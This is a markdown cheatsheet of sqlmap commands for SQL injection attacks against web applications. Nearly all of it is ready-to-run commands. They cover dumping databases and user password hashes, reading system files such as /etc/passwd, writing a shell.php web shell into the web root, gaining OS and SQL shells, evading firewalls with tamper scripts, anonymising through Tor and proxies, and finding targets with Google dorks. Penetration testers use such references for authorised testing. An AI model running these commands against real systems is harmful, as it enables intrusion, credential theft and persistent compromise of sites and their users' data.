# SQLMap Command Cheatsheet

## Table of Contents

1. [Basic Usage & Target Specification](#basic-usage--target-specification)
2. [Database Enumeration](#database-enumeration)
3. [System Information](#system-information)
4. [Advanced Exploitation](#advanced-exploitation)
5. [Detection & Testing Options](#detection--testing-options)
6. [Performance & Stealth](#performance--stealth)
7. [Bypass & Evasion](#bypass--evasion)
8. [Session & Output Management](#session--output-management)
9. [Request Handling & Methods](#request-handling--methods)
10. [Automation & Discovery](#automation--discovery)
11. [Payload Customization](#payload-customization)
12. [Response Analysis](#response-analysis)
13. [Advanced Enumeration](#advanced-enumeration)
14. [Data Extraction & Formatting](#data-extraction--formatting)
15. [Security & Anonymity](#security--anonymity)
16. [Common Command Combinations](#common-command-combinations)

---

## Basic Usage & Target Specification

### Target Options
```bash
# URL-based injection
sqlmap -u "http://example.com/page?id=1"

# Request file (recommended)
sqlmap -r request.txt

# Mark injection point with asterisk
In request.txt: GET /page?id=1* HTTP/1.1
```

### Basic Detection
```bash
# Basic injection detection
sqlmap -u "http://example.com/page?id=1"

# Using request file
sqlmap -r request.txt

# Flush session (start fresh)
sqlmap -r request.txt --flush-session
```

## Database Enumeration

### Database Discovery
```bash
# List all databases
sqlmap -r request.txt --dbs

# Get current database
sqlmap -r request.txt --current-db

# Specify database system (optimization)
sqlmap -r request.txt --dbms=mysql
sqlmap -r request.txt --dbms=postgresql
sqlmap -r request.txt --dbms=mssql
```

### Table Enumeration
```bash
# List tables in specific database
sqlmap -r request.txt -D database_name --tables

# List tables in current database
sqlmap -r request.txt --tables
```

### Column Enumeration
```bash
# List columns in specific table
sqlmap -r request.txt -D database_name -T table_name --columns

# List columns (current db)
sqlmap -r request.txt -T table_name --columns
```

### Data Extraction
```bash
# Dump entire table
sqlmap -r request.txt -D database_name -T table_name --dump

# Dump specific columns
sqlmap -r request.txt -D database_name -T table_name -C "username,password" --dump

# Dump all data from database
sqlmap -r request.txt -D database_name --dump-all

# Dump with conditions
sqlmap -r request.txt -D database_name -T table_name --where="id>100" --dump
```

## System Information

### User & Privileges
```bash
# Get current user
sqlmap -r request.txt --current-user

# Check if current user is DBA
sqlmap -r request.txt --is-dba

# List all database users
sqlmap -r request.txt --users

# Get user privileges
sqlmap -r request.txt --privileges

# Get user passwords
sqlmap -r request.txt --passwords
```

### System Details
```bash
# Get hostname
sqlmap -r request.txt --hostname

# Get database banner
sqlmap -r request.txt --banner
```

## Advanced Exploitation

### File Operations
```bash
# Read system files
sqlmap -r request.txt --file-read="/etc/passwd"
sqlmap -r request.txt --file-read="C:\Windows\System32\drivers\etc\hosts"

# Write files to system
sqlmap -r request.txt --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Command Execution
```bash
# Execute OS commands
sqlmap -r request.txt --os-cmd="whoami"
sqlmap -r request.txt --os-cmd="id"

# Get OS shell
sqlmap -r request.txt --os-shell

# Get SQL shell
sqlmap -r request.txt --sql-shell
```

## Detection & Testing Options

### Injection Techniques
```bash
# Specify techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
sqlmap -r request.txt --technique=B     # Boolean-based blind only
sqlmap -r request.txt --technique=T     # Time-based blind only
sqlmap -r request.txt --technique=U     # Union-based only
sqlmap -r request.txt --technique=BEUST # Multiple techniques
```

### Testing Levels & Risk
```bash
# Set testing level (1-5, default: 1)
sqlmap -r request.txt --level=3
sqlmap -r request.txt --level=5

# Set risk level (1-3, default: 1)
sqlmap -r request.txt --risk=2
sqlmap -r request.txt --risk=3

# Combine level and risk
sqlmap -r request.txt --level=5 --risk=3
```

### Blind Injection Options
```bash
# Specify string for true condition
sqlmap -r request.txt --string="Welcome"

# Specify string for false condition
sqlmap -r request.txt --not-string="Error"

# Set time delay for time-based injection
sqlmap -r request.txt --time-sec=10
```

## Performance & Stealth

### Traffic Control
```bash
# Add delay between requests (seconds)
sqlmap -r request.txt --delay=2

# Set number of threads
sqlmap -r request.txt --threads=5

# Set timeout
sqlmap -r request.txt --timeout=30
```

### Proxy & SSL
```bash
# Use proxy (for debugging with Burp)
sqlmap -r request.txt --proxy="http://127.0.0.1:8080"

# Force SSL/HTTPS
sqlmap -r request.txt --force-ssl

# Ignore SSL certificate errors
sqlmap -r request.txt --ignore-ssl-errors
```

### User Agent & Headers
```bash
# Random User-Agent
sqlmap -r request.txt --random-agent

# Custom User-Agent
sqlmap -r request.txt --user-agent="Custom Agent"

# Additional headers
sqlmap -r request.txt --headers="X-Custom: value"
```

## Bypass & Evasion

### WAF Bypass
```bash
# List available tamper scripts
sqlmap --list-tampers

# Use single tamper script
sqlmap -r request.txt --tamper=space2comment
sqlmap -r request.txt --tamper=randomcase
sqlmap -r request.txt --tamper=equaltolike

# Use multiple tamper scripts
sqlmap -r request.txt --tamper=space2comment,randomcase
```

### Common Tamper Scripts
```bash
# Space bypass
--tamper=space2comment       # Space to /**/
--tamper=space2plus         # Space to +
--tamper=space2randomblank  # Space to random blank char

# Case manipulation
--tamper=randomcase         # Random case keywords
--tamper=uppercase          # UPPERCASE keywords

# Character encoding
--tamper=charencode         # URL encoding
--tamper=charunicodeencode  # Unicode encoding

# Operator bypass
--tamper=equaltolike        # = to LIKE
--tamper=greatest           # > to GREATEST()
```

## Session & Output Management

### Session Management
```bash
# Flush session
sqlmap -r request.txt --flush-session

# Save session to file
sqlmap -r request.txt -s session.txt

# Load session from file
sqlmap -r request.txt -s session.txt
```

### Output Options
```bash
# Verbose output
sqlmap -r request.txt -v 3

# Save output to file
sqlmap -r request.txt --output-dir=/tmp/sqlmap

# Batch mode (non-interactive) - skip all prompts, use defaults
sqlmap -r request.txt --batch

# Answer yes to all questions
sqlmap -r request.txt --answers="quit=N,follow=Y"
```

## Common Command Combinations

### Quick Database Dump
```bash
# Full enumeration and dump
sqlmap -r request.txt --dbs --tables --columns --dump-all --batch

# Specific table dump with optimization
sqlmap -r request.txt -D webapp -T users -C "username,password,email" --dump --threads=5
```

### Stealth Mode
```bash
# Low and slow approach
sqlmap -r request.txt --delay=3 --timeout=30 --level=2 --risk=1 --tamper=randomcase,space2comment
```

### Aggressive Testing
```bash
# Maximum testing
sqlmap -r request.txt --level=5 --risk=3 --threads=10 --technique=BEUST --batch
```

### WAF Bypass Combination
```bash
# Multiple evasion techniques
sqlmap -r request.txt --delay=2 --random-agent --tamper=space2comment,randomcase,charencode --level=3
```

## Request Handling & Methods

### POST Requests
```bash
# POST data injection
sqlmap -u "http://example.com/login" --data="username=admin&password=test"

# Mark POST parameter for injection
sqlmap -u "http://example.com/login" --data="username=admin*&password=test"

# JSON POST data
sqlmap -u "http://example.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookie Injection
```bash
# Cookie parameter injection
sqlmap -u "http://example.com/page" --cookie="PHPSESSID=abc123; trackingId=xyz*"

# Level 2+ required for cookie testing
sqlmap -u "http://example.com/page" --cookie="id=1" --level=2
```

## Injection Point Marking

### Mark Injection Points with Asterisk (*)
```bash
# Mark injection point in URL parameter
sqlmap -u "http://example.com/page?id=1*"

# Mark injection point in POST data
sqlmap -u "http://example.com/login" --data="username=admin*&password=test"

# Mark injection point in Cookie
sqlmap -u "http://example.com/page" --cookie="sessionid=abc123; trackingId=xyz*"

# Mark injection point in custom header
sqlmap -u "http://example.com/page" --header="X-Custom-Header=Value*"

# Mark injection point in JSON data
sqlmap -u "http://example.com/api" --data='{"id":1*,"user":"admin"}' --headers="Content-Type: application/json"
```

## Request Methods & Headers

### HTTP Methods
```bash
# Specify HTTP method explicitly
sqlmap -u "http://example.com/api" --method=GET
sqlmap -u "http://example.com/api" --method=POST --data="param=value"
sqlmap -u "http://example.com/api" --method=PUT --data='{"id":1}'
sqlmap -u "http://example.com/api" --method=DELETE
```

### Headers Management
```bash
# Pass specific cookie header
sqlmap -u "http://example.com/page" --cookie="sessionid=abc123"

# Pass multiple headers using -H/--header
sqlmap -u "http://example.com/page" -H "Authorization: Bearer token123"
sqlmap -u "http://example.com/page" --header "X-Forwarded-For: 127.0.0.1"

# Multiple headers
sqlmap -u "http://example.com/page" -H "X-Real-IP: 1.2.3.4" -H "User-Agent: Custom"
```

### POST Data
```bash
# Basic POST data
sqlmap -u "http://example.com/login" --data="username=admin&password=test"

# POST with custom content type
sqlmap -u "http://example.com/api" --data='{"user":"admin"}' -H "Content-Type: application/json"

# POST with form data
sqlmap -u "http://example.com/form" --data="field1=value1&field2=value2"
```

## Automation & Discovery

### Automatic Target Discovery
```bash
# Crawl website for injection points
sqlmap -u "http://example.com" --crawl=2

# Test forms automatically
sqlmap -u "http://example.com/login.php" --forms

# Google dork integration
sqlmap -g "inurl:php?id="

# Batch processing with crawling
sqlmap -u "http://example.com" --crawl=3 --batch --forms
```

## Request Import & Conversion

### From Browser/Curl to SQLMap
```bash
# Copy request from browser as curl, save to file, then:
# Replace 'curl' with 'sqlmap' in the command

# Example conversion:
curl -X POST "http://example.com/login" -d "user=admin&pass=test" -H "Cookie: session=abc"
# becomes:
sqlmap -X POST "http://example.com/login" -d "user=admin&pass=test" -H "Cookie: session=abc"

# Or save curl command to file and use:
sqlmap -r request_from_curl.txt
```

## Payload Customization

### Payload Structure
SQLMap payloads consist of two parts:
- **Attack Vector**: The actual injection string
- **Boundaries**: Prefix and suffix that wrap the vector to make it a valid query

### Custom Payload Options
```bash
# Add custom prefix to payloads
sqlmap -r request.txt --prefix="')"

# Add custom suffix to payloads
sqlmap -r request.txt --suffix="-- -"

# Show payloads in response (verbose)
sqlmap -r request.txt -v 3

# Combine prefix and suffix
sqlmap -r request.txt --prefix="')" --suffix="-- -"
```

### Risk and Level Configuration
```bash
# Set testing level (1-5, focuses on multiple entry points)
sqlmap -r request.txt --level=3    # Tests cookies, user agents
sqlmap -r request.txt --level=5    # Maximum entry points

# Set risk level (1-3)
sqlmap -r request.txt --risk=1     # Safe SELECT statements only
sqlmap -r request.txt --risk=2     # Adds time-based blind tests
sqlmap -r request.txt --risk=3     # Dangerous OR queries (can affect UPDATE/DELETE)
```

### Risk Level Details
| Risk        | Description                 | Example Payloads                                      | When to Use                           |
| ----------- | --------------------------- | ----------------------------------------------------- | ------------------------------------- |
| 1 (Default) | Safe SELECT-based tests     | `' OR 1=1-- -`<br>`' AND 1=2 UNION ALL SELECT...`     | Always start here                     |
| 2           | Adds time-based blind tests | `' OR SLEEP(5)-- -`<br>`'; WAITFOR DELAY '0:0:5'-- -` | When Risk 1 finds nothing             |
| 3           | OR-based boolean tests      | `' OR 'a'='a'`                                        | **Dangerous!** Can affect all records |

### Error Parsing
```bash
# Enable DBMS error message parsing
sqlmap -r request.txt --parse-errors
```

## Response Analysis

### Response Differentiation
```bash
# Detect based on HTTP status code
sqlmap -r request.txt --code=200

# Detect based on page title changes
sqlmap -r request.txt --titles

# Detect based on specific string presence
sqlmap -r request.txt --string="Welcome back"

# Ignore HTML tags, focus on text content
sqlmap -r request.txt --text-only
```

## Advanced Enumeration

### Comprehensive Database Information
```bash
# Database version banner
sqlmap -r request.txt --banner

# Current user name
sqlmap -r request.txt --current-user

# All database names
sqlmap -r request.txt --dbs

# Current database name
sqlmap -r request.txt --current-db

# Check if current user has DBA rights
sqlmap -r request.txt --is-dba

# Get user passwords
sqlmap -r request.txt --passwords

# Perform all enumeration options
sqlmap -r request.txt --all --batch
```

### Advanced Table and Column Operations
```bash
# Get schema of all tables
sqlmap -r request.txt --schema

# Search for specific string in table/column
sqlmap -r request.txt --search -T users -C username -S "admin"

# List specific columns only
sqlmap -r request.txt -D database -T table -C "username,password,email"
```

### Union-Based Injection Options
```bash
# Specify number of columns for UNION
sqlmap -r request.txt --union-cols=5

# Specify character for UNION-based injections
sqlmap -r request.txt --union-char="NULL"

# Specify table for UNION (required for some DBMS like PostgreSQL)
sqlmap -r request.txt --union-from="information_schema.tables"

# Technique specification (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
sqlmap -r request.txt --technique=BEUST
```

## Data Extraction & Formatting

### Row-Specific Extraction
```bash
# Specify starting row for data dumping
sqlmap -r request.txt -D database -T table --start=10

# Specify ending row for data dumping
sqlmap -r request.txt -D database -T table --stop=20

# Combine start and stop
sqlmap -r request.txt -D database -T table --start=10 --stop=20
```

### Conditional Data Extraction
```bash
# Conditional enumeration with WHERE clause
sqlmap -r request.txt -D database -T users --where="id>100"

# Exclude system databases
sqlmap -r request.txt --dump-all --exclude-sysdbs
```

### Output Formatting
```bash
# Dump data in CSV format
sqlmap -r request.txt -D database -T table --dump-format=CSV

# Dump data in HTML format
sqlmap -r request.txt -D database -T table --dump-format=HTML

# Dump data in SQL format
sqlmap -r request.txt -D database -T table --dump-format=SQL
```

## Security & Anonymity

### CSRF and Session Management
```bash
# Handle CSRF tokens
sqlmap -r request.txt --csrf-token="csrf_token"

# Randomize parameter values
sqlmap -r request.txt --randomize="session_id"

# Evaluate Python expressions in payloads
sqlmap -r request.txt --eval="import hashlib; hash=hashlib.md5(id).hexdigest()"
```

### Proxy and Anonymity
```bash
# Route through single proxy
sqlmap -r request.txt --proxy="http://127.0.0.1:8080"

# Use multiple proxies from file
sqlmap -r request.txt --proxy-file="proxies.txt"

# Route through Tor network
sqlmap -r request.txt --tor

# Check Tor connection
sqlmap -r request.txt --check-tor
```

### WAF Evasion Advanced
```bash
# Skip WAF detection
sqlmap -r request.txt --skip-waf

# Use random User-Agent
sqlmap -r request.txt --random-agent

# Multiple tamper scripts
sqlmap -r request.txt --tamper="space2comment,randomcase,charencode"

# HTTP Parameter Pollution/Chunked encoding
sqlmap -r request.txt --chunked
```